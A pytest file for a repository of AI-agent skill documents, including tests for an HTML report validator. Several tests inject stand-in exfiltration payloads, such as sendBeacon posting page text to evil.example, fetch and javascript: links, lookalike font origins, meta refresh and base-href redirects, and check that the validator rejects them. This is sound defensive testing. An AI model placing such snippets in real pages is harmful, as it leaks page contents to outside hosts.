"""Tests for repository invariants, cross-skill references, and progressive disclosure links."""

import ast
import os
from pathlib import Path
import re
import subprocess
import sys

REPO_DIR = Path(__file__).resolve().parent.parent
SKILLS_DIR = REPO_DIR / "skills"
RULES_FILE = REPO_DIR / "rules" / "AGENTS.md"


def test_rules_file_exists():
    """Verify AGENTS.md exists and is non-empty."""
    assert RULES_FILE.exists()
    assert RULES_FILE.stat().st_size > 1000


def test_no_forbidden_rule_duplicates_in_skills():
    """Ensure kernel invariants (sparklines, character bars, emojis, broken HTML) do not leak into skills."""
    forbidden_snippets = [
        "Unicode sparklines",
        "character bars",
        "❌",
        "✅",
        "⚠️",
        "🚀",
        "</code>",
    ]
    for skill_file in SKILLS_DIR.rglob("*.md"):
        content = skill_file.read_text(encoding="utf-8")
        for snippet in forbidden_snippets:
            assert snippet not in content, (
                f"Forbidden snippet '{snippet}' found in {skill_file}. "
                "Global rules and markdown hygiene must be respected."
            )


def test_cross_skill_references_exist():
    """Verify that every bolded kebab-case skill name in 'Related Skills' exists in skills/."""
    all_skill_names = {d.name for d in SKILLS_DIR.iterdir() if d.is_dir()}
    ref_pattern = re.compile(r"\*\*([a-z0-9]+-[a-z0-9-]+)\*\*")

    for skill_dir in SKILLS_DIR.iterdir():
        if not skill_dir.is_dir():
            continue
        skill_file = skill_dir / "SKILL.md"
        content = skill_file.read_text(encoding="utf-8")
        if "## Related Skills" not in content:
            continue

        related_section = content.split("## Related Skills", 1)[1].split("##", 1)[0]
        matches = ref_pattern.findall(related_section)
        for target in matches:
            assert target in all_skill_names, (
                f"Referenced skill '{target}' in {skill_file} does not exist in skills/"
            )


def test_skill_internal_file_references_exist():
    """Verify that any references/*.md or scripts/*.py path mentioned in skills exists."""
    ref_pattern = re.compile(r"\breferences/[a-z0-9-]+\.md\b")
    script_pattern = re.compile(r"\bscripts/[a-z0-9_]+\.py\b")

    for skill_dir in SKILLS_DIR.iterdir():
        if not skill_dir.is_dir():
            continue
        assert not (skill_dir / "resources").exists(), (
            f"Legacy 'resources/' folder found in {skill_dir.name}; use 'references/' instead."
        )

        skill_file = skill_dir / "SKILL.md"
        content = skill_file.read_text(encoding="utf-8")
        for match in set(
            ref_pattern.findall(content) + script_pattern.findall(content)
        ):
            target_path = skill_dir / match
            assert target_path.exists(), (
                f"Missing referenced file '{match}' in {skill_file} (expected {target_path})"
            )

        for ref_file in (skill_dir / "references").glob("*.md"):
            ref_content = ref_file.read_text(encoding="utf-8")
            for match in set(ref_pattern.findall(ref_content)):
                target_path = skill_dir / match
                assert target_path.exists(), (
                    f"Missing referenced file '{match}' in {ref_file} (expected {target_path})"
                )


def test_python_scripts_complexity_and_safety():
    """Assert all executable Python scripts in skills adhere to indentation and structural budgets."""

    def get_max_depth(node: ast.AST, current: int = 0) -> int:
        depths = [current]
        for child in ast.iter_child_nodes(node):
            if isinstance(child, (ast.If, ast.For, ast.While, ast.With, ast.Try)):
                depths.append(get_max_depth(child, current + 1))
            else:
                depths.append(get_max_depth(child, current))
        return max(depths)

    script_files = list(SKILLS_DIR.glob("*/scripts/*.py"))
    assert len(script_files) > 0, "Expected at least one skill python script"
    for script_file in script_files:
        tree = ast.parse(
            script_file.read_text(encoding="utf-8"), filename=str(script_file)
        )
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                depth = get_max_depth(node)
                assert depth <= 3, (
                    f"Function '{node.name}' in {script_file} has indentation depth {depth} > 3 "
                    f"(violates rules/AGENTS.md structural complexity threshold)"
                )


def test_progress_visibility_rule_invariants():
    """Verify AGENTS.md and python-pro enforce progress visibility for long tasks."""
    rules_text = RULES_FILE.read_text(encoding="utf-8")
    assert "Progress Visibility for Long Tasks" in rules_text
    assert "tqdm" in rules_text

    python_pro_skill = SKILLS_DIR / "python-pro" / "SKILL.md"
    assert python_pro_skill.exists()
    skill_text = python_pro_skill.read_text(encoding="utf-8")
    assert "Progress Visibility" in skill_text
    assert "tqdm" in skill_text


def test_token_efficiency_adopted_rules_present():
    """Verify AGENTS.md carries the clauses adopted from the token-efficiency repos."""
    rules_text = RULES_FILE.read_text(encoding="utf-8")
    assert "Adaptive Brevity & Information Density" in rules_text, (
        "rules/AGENTS.md is missing the Adaptive Brevity & Information Density rule"
    )
    assert "Payload integrity" in rules_text, (
        "Adaptive Brevity is missing the payload-integrity clause"
    )
    assert "Acceptance Criteria First" in rules_text, (
        "rules/AGENTS.md is missing the Acceptance Criteria First rule"
    )
    assert "Think in code" in rules_text, (
        "Token & Action Discipline is missing the think-in-code clause"
    )
    assert "Clean up the orphans your own change created" in rules_text, (
        "Scope Discipline is missing the orphan-cleanup clause"
    )

    minimalism_skill = SKILLS_DIR / "code-minimalism" / "SKILL.md"
    skill_text = minimalism_skill.read_text(encoding="utf-8")
    assert "Equal-size tiebreak" in skill_text, (
        "code-minimalism is missing the equal-size tiebreak"
    )
    assert "what was skipped or not checked" in skill_text, (
        "code-minimalism is missing the reply disclosure line"
    )


def test_related_skills_graph_degrees():
    """Verify every skill has at least two outgoing and two incoming handoffs."""
    all_skills = {d.name for d in SKILLS_DIR.iterdir() if d.is_dir()}
    ref_pattern = re.compile(r"\*\*([a-z0-9]+-[a-z0-9-]+)\*\*")
    outgoing: dict[str, set[str]] = {}

    for name in all_skills:
        content = (SKILLS_DIR / name / "SKILL.md").read_text(encoding="utf-8")
        assert "## Related Skills" in content, (
            f"{name} has no '## Related Skills' section"
        )
        section = content.split("## Related Skills", 1)[1].split("\n## ", 1)[0]
        outgoing[name] = set(ref_pattern.findall(section))

    incoming: dict[str, set[str]] = {name: set() for name in all_skills}
    for source, targets in outgoing.items():
        for target in targets:
            assert target in all_skills, f"{source} links to unknown skill '{target}'"
            assert target != source, f"{source} links to itself"
            incoming[target].add(source)

    for name in sorted(all_skills):
        assert len(outgoing[name]) >= 2, (
            f"{name} has out_degree {len(outgoing[name])} (<2); add '## Related Skills' handoffs."
        )
        assert len(incoming[name]) >= 2, (
            f"{name} has in_degree {len(incoming[name])} (<2); another skill must hand off to it."
        )


def test_readme_covers_every_skill():
    """Verify the README catalog matches the skill directories exactly."""
    readme = (REPO_DIR / "README.md").read_text(encoding="utf-8")
    skill_names = {d.name for d in SKILLS_DIR.iterdir() if d.is_dir()}
    catalog = readme.split("## Skills Catalog", 1)[1].split("\n## ", 1)[0]
    catalog_names = set(re.findall(r"\|\s*\*\*`([a-z0-9-]+)`\*\*\s*\|", catalog))
    assert catalog_names == skill_names, (
        f"README catalog mismatch. Missing: {sorted(skill_names - catalog_names)}; "
        f"extra: {sorted(catalog_names - skill_names)}"
    )


def test_artifact_paths_use_iso_dates():
    """Verify design, contract, and review artifacts enforce ISO-dated paths."""
    for skill_name in (
        "spec-driven-design",
        "codebase-contracts",
        "doubt-driven-development",
        "technical-reporting",
        "html-report",
        "ux-product-shaper",
        "design-system",
        "ui-accessibility",
        "ux-critic",
    ):
        content = (SKILLS_DIR / skill_name / "SKILL.md").read_text(encoding="utf-8")
        assert "YYYY-MM-DD_" in content, (
            f"{skill_name} does not mandate ISO-dated artifact paths"
        )

    spec = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(encoding="utf-8")
    assert "docs/designs/YYYY-MM-DD_" in spec, (
        "spec-driven-design must write under docs/designs/"
    )
    contracts = (SKILLS_DIR / "codebase-contracts" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "docs/reports/YYYY-MM-DD_drift-report_" in contracts
    review = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "docs/reports/YYYY-MM-DD_goldfish-review_" in review
    html_report = (SKILLS_DIR / "html-report" / "SKILL.md").read_text(encoding="utf-8")
    assert "docs/reports/YYYY-MM-DD_" in html_report
    assert ".html" in html_report
    ux_shape = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "docs/designs/YYYY-MM-DD_product-brief_" in ux_shape
    design_system = (SKILLS_DIR / "design-system" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "docs/designs/YYYY-MM-DD_design-system_" in design_system
    assert "docs/designs/YYYY-MM-DD_tokens_" in design_system
    a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
    assert "docs/reports/YYYY-MM-DD_a11y-audit_" in a11y
    critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
    assert "docs/reports/YYYY-MM-DD_ux-critique_" in critic


def test_no_claude_or_plugin_escape_hatches():
    """Verify the consolidated suite has no Claude-specific or legacy plugin escape hatches."""
    forbidden = [
        "CLAUDE_PLUGIN_ROOT",
        "~/.claude",
        "$HOME/.claude",
        "Claude Code",
        "claude.md",
    ]
    targets = list(SKILLS_DIR.rglob("*.md")) + [
        RULES_FILE,
        REPO_DIR / "README.md",
    ]
    for path in targets:
        content = path.read_text(encoding="utf-8")
        for snippet in forbidden:
            assert snippet not in content, (
                f"Legacy host escape hatch '{snippet}' found in {path}"
            )


def test_no_hermes_host_support():
    """Verify Hermes host support and its multi-profile bot specs are fully removed."""
    forbidden = ("hermes", "seven-bots", "seven_bots")
    targets = [
        RULES_FILE,
        REPO_DIR / "README.md",
        REPO_DIR / "setup.sh",
        *SKILLS_DIR.rglob("*.md"),
    ]
    for path in targets:
        content = path.read_text(encoding="utf-8").lower()
        for snippet in forbidden:
            assert snippet not in content, (
                f"Removed Hermes reference '{snippet}' found in {path}"
            )


def test_code_review_goldfish_lenses_integrity():
    """Verify the code-review Goldfish reference defines all five personas and is wired in."""
    reference = (
        SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md"
    )
    assert reference.exists(), "Missing code-review Goldfish lens reference"
    content = reference.read_text(encoding="utf-8")

    personas = [
        "cr-correctness-invariants",
        "cr-mechanism-generalization",
        "cr-codebase-reuse-and-contracts",
        "cr-concurrency-memory-perf",
        "cr-security-trust-boundary",
    ]
    for persona in personas:
        assert persona in content, f"Missing persona '{persona}' in {reference}"

    for required in ("git grep", "PROPOSE FIX", "CONTEST", "ESCALATE", "DECLINE"):
        assert required in content, f"Missing '{required}' in {reference}"

    for emoji in ("❌", "✅", "⚠️", "🚀"):
        assert emoji not in content, f"Forbidden emoji '{emoji}' in {reference}"

    skill_text = (SKILLS_DIR / "code-review" / "SKILL.md").read_text(encoding="utf-8")
    assert "references/goldfish-code-review-lenses.md" in skill_text
    assert "cr-mechanism-generalization" in skill_text
    assert "cr-codebase-reuse-and-contracts" in skill_text
    assert "Specialist escalation" in skill_text
    assert "Specialist escalation" in content
    assert "Contextual logging" in content
    assert "Type discipline" in content
    assert "git grep -nw '<symbol>' -- ." in content


def test_goldfish_persona_lifecycle_and_tiering_invariants():
    """Verify tiering, lifecycle vectors, Security lens, and SOTA research in Goldfish specs."""
    # Doubt-driven-development tiering and schema migration
    ddd_ref = (
        SKILLS_DIR
        / "doubt-driven-development"
        / "references"
        / "goldfish-review-lenses.md"
    )
    assert ddd_ref.exists()
    ddd_content = ddd_ref.read_text(encoding="utf-8")
    assert "Plan Review Scope Tiering" in ddd_content
    assert "Fast Plan Tier" in ddd_content
    assert "Full Architecture Tier" in ddd_content
    assert "data migration & schema safety" in ddd_content

    ddd_skill = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "Fast Plan Tier" in ddd_skill
    assert "data & schema migration" in ddd_skill

    # Spec-driven-design tiering, Security lens, SOTA lens, and arbitration
    sdd_ref = (
        SKILLS_DIR
        / "spec-driven-design"
        / "references"
        / "spec-templates-and-standards.md"
    )
    assert sdd_ref.exists()
    sdd_content = sdd_ref.read_text(encoding="utf-8")
    assert "Risk-Based Brainstorm Tiering" in sdd_content
    assert "Core Tier" in sdd_content
    assert "Full Tier" in sdd_content
    assert "Lens 7: Security, Privacy & Threat Modeling" in sdd_content
    assert "Specialist Lens: SOTA & Industry Prior-Art" in sdd_content
    assert "Arbitration Precedence Standard" in sdd_content
    assert (
        "Skill context: spec-driven-design (skills/spec-driven-design/SKILL.md)"
        in sdd_content
    )
    assert (
        "Skill context: tech-research (skills/tech-research/SKILL.md), context7-mcp"
        in sdd_content
    )

    sdd_skill = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "Security & Threat Modeling" in sdd_skill
    assert "SOTA & Industry Prior-Art" in sdd_skill
    assert "Arbitration Precedence Standard" in sdd_skill


HTML_REPORT_VALIDATOR = SKILLS_DIR / "html-report" / "scripts" / "check_html_report.py"

HTML_REPORT_FIXTURE = """<!DOCTYPE html>
<html lang="en" data-preset="dossier" data-theme="light">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
<title>Report</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400&display=swap" rel="stylesheet">
<style>
:root, :root[data-preset="dossier"] { --bg: #F7F4EE; }
:root[data-preset="zen-garden"] .report-section { grid-template-columns: 1fr; }
:root[data-theme="light"] { --ink: #22201E; }
:root[data-theme="dark"] { --ink: #EDE8DF; }
@media (prefers-color-scheme: dark) { :root { --ink: #EDE8DF; } }
@media (prefers-reduced-motion: reduce) { * { animation: none; } }
@media print { details:not([open]) > * { display: block; } @page { margin: 16mm 14mm; } }
.num { font-variant-numeric: tabular-nums; font-optical-sizing: auto; }
:focus-visible { outline: 2px solid #9E583B; }
</style>
</head>
<body>
<h1>Report</h1>
<button type="button" id="theme-toggle" aria-label="Toggle color theme">Theme</button>
<table><thead><tr><th scope="col">Metric</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>
<script>const answer = 42;</script>
</body>
</html>
"""


def _run_validator_path(path: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(HTML_REPORT_VALIDATOR), str(path)],
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )


def _run_html_report_validator(
    tmp_path: Path, content: str
) -> subprocess.CompletedProcess[str]:
    report = tmp_path / "report.html"
    report.write_text(content, encoding="utf-8")
    return _run_validator_path(report)


def test_html_report_skill_integrity():
    """Verify the html-report skill, review gate, and handoffs are wired in."""
    skill_file = SKILLS_DIR / "html-report" / "SKILL.md"
    reference = SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
    gate_file = SKILLS_DIR / "html-report" / "references" / "review-gate.md"
    assert skill_file.exists(), "Missing html-report SKILL.md"
    assert reference.exists(), "Missing html-report scaffold reference"
    assert gate_file.exists(), "Missing html-report review gate reference"

    skill_text = skill_file.read_text(encoding="utf-8")
    gate = gate_file.read_text(encoding="utf-8")

    assert "references/html-report-scaffold.md" in skill_text
    assert "references/review-gate.md" in skill_text
    for skill_name in (
        "technical-reporting",
        "data-visualization",
        "ui-accessibility",
        "ux-critic",
    ):
        assert f"**{skill_name}**" in skill_text, (
            f"Missing Related Skills handoff to {skill_name}"
        )
    assert "review gate" in skill_text.lower()
    assert "blocking" in skill_text.lower()
    assert "Exactly one preset" in skill_text

    for marker in (
        "Visual Quality Bar",
        "1440x900",
        "390x844",
        "320px",
        "Missing screenshots",
    ):
        assert marker in skill_text, f"Missing blocking gate marker '{marker}'"
    for marker in (
        "Hard Fails",
        "review record",
        "Do not deliver",
        "2 cycles",
        "Render Matrix",
    ):
        assert marker.lower() in gate.lower(), f"Missing review gate detail '{marker}'"
    for marker in (
        "Content-Security-Policy",
        "credential-shaped string",
        "approved Chart.js exception",
    ):
        assert marker.lower() in skill_text.lower() or marker.lower() in gate.lower(), (
            f"Missing CSP/secret/network contract '{marker}'"
        )
    assert "docs/reports/YYYY-MM-DD_" in skill_text
    assert "_review.md" in skill_text

    for profile in ("Internal", "Shared", "Print", "Executive"):
        assert profile in skill_text, (
            f"Missing report review profile '{profile}' in SKILL"
        )
        assert profile in gate, (
            f"Missing report review profile '{profile}' in review gate"
        )

    a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
    critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
    assert "**html-report**" in a11y, (
        "ui-accessibility must hand off HTML report review"
    )
    assert "**html-report**" in critic, "ux-critic must hand off HTML report critique"
    assert "blocking gate" in a11y.lower(), (
        "ui-accessibility report audit must be blocking"
    )
    assert "blocking gate" in critic.lower(), (
        "ux-critic report critique must be blocking"
    )

    for approval_rule in ("explicitly approves", "offline warning", "SRI hash"):
        assert approval_rule in skill_text, (
            f"Missing controlled CDN rule '{approval_rule}'"
        )
    assert "only default network request" in skill_text
    assert "keep the screenshots" in gate.lower()


def test_html_report_scaffold_integrity():
    """Verify the scaffold skeleton, CSP, controls, and preset contract."""
    scaffold = (
        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
    ).read_text(encoding="utf-8")

    for marker in (
        "<!DOCTYPE html>",
        "Content-Security-Policy",
        "connect-src 'none'",
        "base-uri 'none'",
        "form-action 'none'",
        "prefers-color-scheme",
        "prefers-reduced-motion",
        "@media print",
        "tabular-nums",
        "font-optical-sizing",
        "theme-toggle",
        "fonts.googleapis.com",
        "display=swap",
    ):
        assert marker in scaffold, f"Missing scaffold marker '{marker}'"
    for marker in (
        "Structural Self-Check",
        "check_html_report.py",
        "Render Evidence",
        "Review Record",
    ):
        assert marker in scaffold, f"Missing scaffold workflow marker '{marker}'"
    for preset in (
        'data-preset="dossier"',
        'data-preset="zen-garden"',
        'data-preset="chronicle"',
        'data-preset="sumi-ink"',
        'data-preset="shoji-grid"',
        'data-preset="aizome-indigo"',
        'data-preset="yugen-noir"',
    ):
        assert preset in scaffold, f"Missing scaffold preset '{preset}'"
    for removed in (
        "preset-btn",
        "preset-group",
        "expand-all",
        "collapse-all",
        "copy-summary",
    ):
        assert removed not in scaffold, (
            f"Scaffold still contains redundant control '{removed}'"
        )
    assert 'id="theme-toggle"' in scaffold, "Scaffold must keep one theme toggle"
    assert "0.72rem" not in scaffold and "0.7rem" not in scaffold, (
        "Scaffold still uses label sizes below the 0.75rem minimum"
    )
    assert "REPLACE_WITH" not in scaffold, (
        "Scaffold still contains an unresolved SRI placeholder"
    )
    assert "#878079" in scaffold, (
        "Scaffold context series must use the 3:1 warm stone token"
    )
    assert "--chart-ps: #4A6B53" not in scaffold, (
        "Zen Garden charts must use the shared warm palette"
    )
    assert "keep the screenshots" in scaffold.lower()

    for emoji in ("❌", "✅", "⚠️", "🚀"):
        assert emoji not in scaffold, f"Forbidden emoji '{emoji}' in scaffold"


def test_html_report_validator_blocks_structural_drift(tmp_path):
    """Verify the structural validator passes a complete file and fails preset drift."""
    baseline = _run_html_report_validator(tmp_path, HTML_REPORT_FIXTURE)
    assert baseline.returncode == 0, baseline.stdout + baseline.stderr
    assert "PASS" in baseline.stdout

    broken = HTML_REPORT_FIXTURE.replace(
        ':root[data-theme="light"]',
        ':root[data-preset="zen-garden"] { --bg: #F4F1EA; }\n:root[data-theme="light"]',
    )
    failed = _run_html_report_validator(tmp_path, broken)
    assert failed.returncode == 1, failed.stdout + failed.stderr
    assert "multiple preset blocks" in failed.stdout


def test_html_report_validator_rejects_origin_prefixes(tmp_path):
    """Exact origins are required for fonts and Chart.js."""
    evil_font = HTML_REPORT_FIXTURE.replace(
        "https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400&display=swap",
        "https://fonts.googleapis.com.evil.example/fonts.googleapis.com/css2?family=Fraunces&display=swap",
    )
    result = _run_html_report_validator(tmp_path, evil_font)
    assert result.returncode == 1
    assert "external" in result.stdout.lower() or "font" in result.stdout.lower()

    evil_chart = HTML_REPORT_FIXTURE.replace(
        "</body>",
        '<script src="https://evil.example/x?cdn.jsdelivr.net/npm/chart.js@" '
        'integrity="sha384-x" crossorigin="anonymous"></script></body>',
    )
    result = _run_html_report_validator(tmp_path, evil_chart)
    assert result.returncode == 1
    assert "external or sidecar assets" in result.stdout


def test_html_report_validator_rejects_event_and_url_vectors(tmp_path):
    """Common inline-handler and request vectors must fail."""
    cases = {
        "onpointerdown": HTML_REPORT_FIXTURE.replace(
            'id="theme-toggle"', 'id="theme-toggle" onpointerdown="steal()"'
        ),
        "onwheel": HTML_REPORT_FIXTURE.replace(
            'id="theme-toggle"', 'id="theme-toggle" onwheel="steal()"'
        ),
        "fetch_space": HTML_REPORT_FIXTURE.replace(
            "const answer = 42;", 'fetch ("https://evil.example")'
        ),
        "srcset": HTML_REPORT_FIXTURE.replace(
            "<h1>Report</h1>",
            '<h1>Report</h1><img src="data:," srcset="https://evil.example/x.png 1x" alt="">',
        ),
        "sendbeacon": HTML_REPORT_FIXTURE.replace(
            "const answer = 42;",
            'navigator.sendBeacon("https://evil.example", document.body.innerText)',
        ),
        "meta_refresh": HTML_REPORT_FIXTURE.replace(
            "</head>",
            '<meta http-equiv="refresh" content="0;url=https://evil.example/"></head>',
        ),
        "base_href": HTML_REPORT_FIXTURE.replace(
            "</head>", '<base href="https://evil.example/"></head>'
        ),
        "javascript_href": HTML_REPORT_FIXTURE.replace(
            "<h1>Report</h1>",
            "<h1>Report</h1><a href=\"javascript:fetch('https://evil.example')\">x</a>",
        ),
        "form_action": HTML_REPORT_FIXTURE.replace(
            "<h1>Report</h1>",
            '<h1>Report</h1><form action="https://evil.example/"></form>',
        ),
        "poster": HTML_REPORT_FIXTURE.replace(
            "<h1>Report</h1>",
            '<h1>Report</h1><video poster="https://evil.example/p.png"></video>',
        ),
    }
    for name, content in cases.items():
        result = _run_html_report_validator(tmp_path, content)
        assert result.returncode == 1, f"{name} passed: {result.stdout}"
        assert any(
            marker in result.stdout
            for marker in (
                "inline event handlers",
                "external or sidecar assets",
                "inline script network calls",
            )
        ), f"{name} produced an unexpected failure: {result.stdout}"


def test_html_report_validator_io_bounds(tmp_path):
    """Reject non-regular and oversized files before reading them."""
    fifo = tmp_path / "report.fifo"
    os.mkfifo(fifo)
    result = _run_validator_path(fifo)
    assert result.returncode == 1
    assert "not a regular file" in result.stdout

    sparse = tmp_path / "huge.html"
    with sparse.open("wb") as handle:
        handle.truncate(2_000_000_000)
    result = _run_validator_path(sparse)
    assert result.returncode == 1
    assert "limit" in result.stdout.lower()


def test_html_report_validator_css_and_preset_parsing(tmp_path):
    """Comments, quoting, duplicates, and layout overrides must parse correctly."""
    commented_print = HTML_REPORT_FIXTURE.replace(
        "@media print { details:not([open]) > * { display: block; } @page { margin: 16mm 14mm; } }",
        "/* @media print */\n@page { margin: 16mm 14mm; }",
    )
    result = _run_html_report_validator(tmp_path, commented_print)
    assert result.returncode == 1
    assert "missing CSS marker: @media print" in result.stdout

    duplicate = HTML_REPORT_FIXTURE.replace(
        ':root[data-theme="light"]',
        ':root[data-preset="dossier"] { --bg: #000; }\n:root[data-theme="light"]',
    )
    result = _run_html_report_validator(tmp_path, duplicate)
    assert result.returncode == 1
    assert "duplicate preset token block" in result.stdout

    single_quote = HTML_REPORT_FIXTURE.replace('data-theme="dark"', "data-theme='dark'")
    result = _run_html_report_validator(tmp_path, single_quote)
    assert result.returncode == 0, result.stdout

    no_token = HTML_REPORT_FIXTURE.replace(
        ':root, :root[data-preset="dossier"] {', ":root {"
    ).replace('data-preset="dossier"', 'data-preset="chronicle"')
    result = _run_html_report_validator(tmp_path, no_token)
    assert result.returncode == 1
    assert (
        "missing preset token block" in result.stdout
        or "missing token block for chosen preset" in result.stdout
    )


def test_html_report_validator_accepts_composition_axes(tmp_path):
    """A non-canonical layout and voice pass. An unknown layout fails."""
    mixed = HTML_REPORT_FIXTURE.replace(
        '<html lang="en" data-preset="dossier" data-theme="light">',
        '<html lang="en" data-preset="aizome-indigo" data-layout="L4" '
        'data-voice="V4" data-theme="light">',
    ).replace(
        ':root, :root[data-preset="dossier"] { --bg: #F7F4EE; }',
        ':root[data-preset="aizome-indigo"] { --bg: #F3F6F8; }',
    )
    passed = _run_html_report_validator(tmp_path, mixed)
    assert passed.returncode == 0, passed.stdout + passed.stderr

    unknown = HTML_REPORT_FIXTURE.replace(
        '<html lang="en" data-preset="dossier" data-theme="light">',
        '<html lang="en" data-preset="dossier" data-layout="L9" data-theme="light">',
    )
    failed = _run_html_report_validator(tmp_path, unknown)
    assert failed.returncode == 1, failed.stdout + failed.stderr
    assert "data-layout" in failed.stdout


def test_composition_grammar_present():
    """The mix rules live in one file and the design-system skill points at it."""
    path = SKILLS_DIR / "design-system" / "references" / "composition-grammar.md"
    text = path.read_text(encoding="utf-8")
    for marker in (
        "editorial-brief",
        "long-form",
        "ops-monitor",
        "quant-surface",
        "studio-night",
        "native-consumer",
        "developer-console",
        "data-layout",
        "task slug",
        "SHA-256",
        "close-brief",
        "latency-wall",
    ):
        assert marker in text, f"composition grammar missing '{marker}'"
    skill = (SKILLS_DIR / "design-system" / "SKILL.md").read_text(encoding="utf-8")
    assert "references/composition-grammar.md" in skill


def test_html_report_validator_rejects_secrets(tmp_path):
    """Credential-shaped strings block delivery without printing the value."""
    content = HTML_REPORT_FIXTURE.replace(
        "const answer = 42;",
        'const token = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop";',
    )
    result = _run_html_report_validator(tmp_path, content)
    assert result.returncode == 1
    assert "credential-shaped string detected: bearer-token" in result.stdout
    assert "eyJhbGciOiJIUzI1NiJ9" not in result.stdout


def test_html_report_validator_csp_and_chart_exception(tmp_path):
    """CSP is required, and the approved Chart.js origin is the only exception."""
    no_csp = HTML_REPORT_FIXTURE.replace(
        '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
        "script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src https://fonts.gstatic.com; img-src data:; connect-src 'none'; "
        "object-src 'none'; base-uri 'none'; form-action 'none'\">\n",
        "",
    )
    result = _run_html_report_validator(tmp_path, no_csp)
    assert result.returncode == 1
    assert "missing Content-Security-Policy" in result.stdout

    open_connect = HTML_REPORT_FIXTURE.replace("connect-src 'none'", "connect-src *")
    result = _run_html_report_validator(tmp_path, open_connect)
    assert result.returncode == 1
    assert "connect-src" in result.stdout

    chart = HTML_REPORT_FIXTURE.replace(
        "script-src 'unsafe-inline'",
        "script-src 'unsafe-inline' https://cdn.jsdelivr.net",
    ).replace(
        "</body>",
        '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js" '
        'integrity="sha384-9nhczxUqK87bcKHh20fSQcTGD4qq5GhayNYSYWqwBkINBhOfQLg/P5HG5lF1urn4" '
        'crossorigin="anonymous"></script></body>',
    )
    result = _run_html_report_validator(tmp_path, chart)
    assert result.returncode == 0, result.stdout


def test_html_report_review_evidence_retention():
    """The review record and scaffold agree that linked screenshots are retained."""
    gate = (SKILLS_DIR / "html-report" / "references" / "review-gate.md").read_text(
        encoding="utf-8"
    )
    scaffold = (
        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
    ).read_text(encoding="utf-8")
    assert "keep the screenshots" in gate.lower()
    assert "delete only unreferenced" in gate.lower()
    assert "keep the screenshots" in scaffold.lower()


def test_ui_ux_family_integrity():
    """Verify the UI/UX family, its references, and its ownership boundaries."""
    family = {
        "ux-product-shaper": (
            "product-and-state-contracts.md",
            (
                "Surface Mode",
                "8-State",
                "PRODUCT.md",
                "docs/designs/",
                "YAGNI",
                "Minimalist Register",
                "NOT Building",
            ),
        ),
        "design-system": (
            "token-and-component-specs.md",
            (
                "W3C DTCG",
                "tokens.css",
                "html-report",
                "plotly-dash",
                "Monochrome",
                "1 Accent",
                "Rule of Three",
                "20-25",
            ),
        ),
        "ui-accessibility": (
            "wcag-2-2-audit.md",
            (
                "WCAG 2.2",
                "keyboard",
                "code-review",
                "verify-and-stop",
                "False Minimalism",
                "Clickability",
            ),
        ),
        "ux-critic": (
            "heuristic-critique.md",
            (
                "Nielsen",
                "squint",
                "doubt-driven-development",
                "docs/reports/",
                "Dieter Rams",
                "Subtraction",
                "THE ONE DELETION",
                "YAGNI",
            ),
        ),
    }

    for name, (ref_name, markers) in family.items():
        skill_file = SKILLS_DIR / name / "SKILL.md"
        reference = SKILLS_DIR / name / "references" / ref_name
        assert skill_file.exists(), f"Missing {name}/SKILL.md"
        assert reference.exists(), f"Missing {name}/references/{ref_name}"

        skill_text = skill_file.read_text(encoding="utf-8")
        ref_text = reference.read_text(encoding="utf-8")
        assert f"references/{ref_name}" in skill_text, (
            f"{name} does not link its reference"
        )

        for marker in markers:
            assert marker in skill_text or marker in ref_text, (
                f"Missing '{marker}' in {name}"
            )

        for emoji in ("❌", "✅", "⚠️", "🚀"):
            assert emoji not in skill_text, f"Forbidden emoji '{emoji}' in {skill_file}"
            assert emoji not in ref_text, f"Forbidden emoji '{emoji}' in {reference}"

    shaper_skill = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    shaper_ref = (
        SKILLS_DIR
        / "ux-product-shaper"
        / "references"
        / "product-and-state-contracts.md"
    ).read_text(encoding="utf-8")
    assert "4-6" not in shaper_skill, (
        "ux-product-shaper reintroduced the 4-6 navigation cap"
    )
    assert "4 numbered items" in shaper_skill, (
        "ux-product-shaper must cap navigation at 4 items"
    )
    assert "At most 4 top-level navigation items." in shaper_ref, (
        "ux-product-shaper reference must agree on the 4-item navigation cap"
    )
    assert "2.5x-3x" in shaper_skill and "3x+" in shaper_skill, (
        "ux-product-shaper must separate page-title and KPI hero sizes"
    )
